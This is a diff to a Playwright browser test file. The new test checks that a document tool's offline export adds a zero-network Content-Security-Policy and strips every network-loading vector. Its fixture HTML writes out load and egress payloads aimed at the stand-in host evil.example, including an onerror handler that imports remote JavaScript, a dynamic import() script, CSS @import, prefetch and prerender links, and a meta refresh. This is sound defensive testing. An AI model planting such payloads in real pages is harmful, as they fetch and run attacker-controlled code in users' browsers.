@@ -164,9 +164,9 @@ function expectForwardCompatibleContract(html, mode) {
 
 function mediaLoadAttributes(html) {
   const refs = [];
-  const tagRe = /<(script|link|img|source|iframe|video|audio|object|embed)\b[^>]*>/gi;
+  const tagRe = /<(script|link|img|source|iframe|video|audio|object|embed|track|image|use|input|meta|body|table|td|th)\b[^>]*>/gi;
   for (const tag of html.matchAll(tagRe)) {
-    for (const attr of tag[0].matchAll(/\s(href|src|srcset|poster|data)\s*=\s*["']([^"']+)["']/gi)) {
+    for (const attr of tag[0].matchAll(/\s(href|xlink:href|src|srcset|poster|data|background|content)\s*=\s*["']([^"']+)["']/gi)) {
       refs.push({ tag: tag[1].toLowerCase(), attr: attr[1].toLowerCase(), value: attr[2] });
     }
   }
@@ -182,6 +182,13 @@ function networkLoadRefs(html) {
     }
   }
   return refs;
+}
+
+function cspMetaContent(html) {
+  const m = html.match(/<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/i);
+  if (!m) return "";
+  const c = m[0].match(/\scontent=(["'])([\s\S]*?)\1/i);
+  return c ? c[2] : "";
 }
 
 test("Export Offline snapshots mermaid and Chart.js charts for zero-network reopen (CMH-OFFLINE-01, CMH-OFFLINE-02)", async ({ page, browser }) => {
@@ -330,5 +337,87 @@ test("editing an already-offline document preserves offline mode and offline exp
     expect(offlineHtml).toContain("preserve this offline note");
   } finally {
     fs.rmSync(staged.dir, { recursive: true, force: true });
+  }
+});
+
+test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and event-handler egress (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
+  const CONTENT_WITH_EGRESS = `
+<h1>Offline zero network</h1>
+<style>
+@import "https://evil.example/imported.css";
+.remote-bg { background-image: url("//evil.example/bg.png"); }
+</style>
+<link rel="prefetch" href="https://evil.example/prefetch.js">
+<link rel="prerender" href="https://evil.example/prerender.html">
+<meta http-equiv="refresh" content="9999; url=https://evil.example/refresh">
+<p id="egress-note">Offline export must strip every load vector.</p>
+<img id="sameOriginBeacon" alt="same origin beacon" src="__SAME_ORIGIN__/same-origin.png">
+<img id="handlerProbe" alt="handler probe" src="data:image/gif;base64,AA" onerror="import('https://evil.example/onerror.js')">
+<svg width="20" height="20" aria-label="remote svg refs">
+  <image href="https://evil.example/vector.png" width="20" height="20"></image>
+  <use href="https://evil.example/sprite.svg#icon"></use>
+</svg>
+<video poster="https://evil.example/poster.png"><track src="https://evil.example/captions.vtt"></video>
+<input type="image" alt="submit" src="https://evil.example/input.png">
+<div background="https://evil.example/background.png">legacy background</div>
+<script>const u = "https://evil.example/dynamic-import.js"; import(u);</script>`;
+  const staged = stageContent(CONTENT_WITH_EGRESS, { key: "cmh-offline-zero-network", source: "offline-zero.html" });
+  const server = await startStaticServer(staged.dir);
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    fs.writeFileSync(path.join(staged.dir, "same-origin.png"), Buffer.from("not a real image"));
+    fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(/__SAME_ORIGIN__/g, server.url));
+    await page.route(/^https?:\/\//, async (route) => {
+      const url = route.request().url();
+      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
+      return route.abort();
+    });
+    await installDownloadTextCapture(page);
+    await page.goto(server.url + "/test-doc.html");
+    await ready(page);
+    await openToolbarMenu(page);
+
+    const [download] = await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
+    const exportedHtml = await capturedDownloadText(page);
+    const csp = cspMetaContent(exportedHtml);
+    expect(csp).toContain("default-src 'none'");
+    expect(csp).toContain("script-src 'unsafe-inline'");
+    expect(csp).toContain("connect-src 'none'");
+    expect(csp).toContain("base-uri 'none'");
+    const handlerTag = exportedHtml.match(/<img\b[^>]*id="handlerProbe"[^>]*>/i);
+    expect(handlerTag && handlerTag[0]).toBeTruthy();
+    expect(handlerTag[0]).not.toMatch(/\sonerror\s*=/i);
+    expect(exportedHtml).not.toContain("evil.example");
+    expect(exportedHtml).not.toContain(server.url + "/same-origin.png");
+    expect(exportedHtml).not.toMatch(/<link\b[^>]*rel=["'][^"']*(?:prefetch|prerender)/i);
+    expect(exportedHtml).not.toMatch(/<meta\b[^>]*http-equiv=["']refresh/i);
+    expect(exportedHtml).not.toMatch(/@import\s/i);
+    expect(networkLoadRefs(exportedHtml)).toEqual([]);
+
+    const exportedPath = path.join(outDir, "offline-zero.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    execFileSync(PYTHON, ["tools/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    await server.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
   }
 });
